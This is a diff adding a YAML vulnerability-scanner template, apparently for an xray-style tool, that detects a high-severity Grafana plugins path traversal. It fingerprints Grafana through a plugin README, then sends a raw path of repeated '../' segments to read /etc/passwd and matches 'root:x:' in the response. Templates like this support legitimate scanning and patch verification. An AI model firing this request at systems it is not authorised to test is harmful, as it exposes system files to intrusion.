@@ -1,0 +1,33 @@
+id: poc-yaml-grafana-plugins-path-traversal
+info:
+  name: grafana 插件路径遍历漏洞
+  severity: high
+  tags:
+  - 目录遍历
+  finger: grafana
+variables:
+  r_path: '/
+
+    /grafana/
+
+    '
+requests:
+- method: GET
+  path: '{{.r_path}}public/plugins/graph/README.md'
+  expression: 'status_code == 200 &&
+
+    contains(body, "Graph Panel") &&
+
+    !contains(body, "<")
+
+    '
+- method: GET
+  rawPath: '{{.r_path}}public/plugins/graph/#/../../../../../../../../../../../../../../../etc/passwd'
+  expression: 'status_code == 200 &&
+
+    contains(body, "root:x:") &&
+
+    !contains(body, "<")
+
+    '
+transport: http
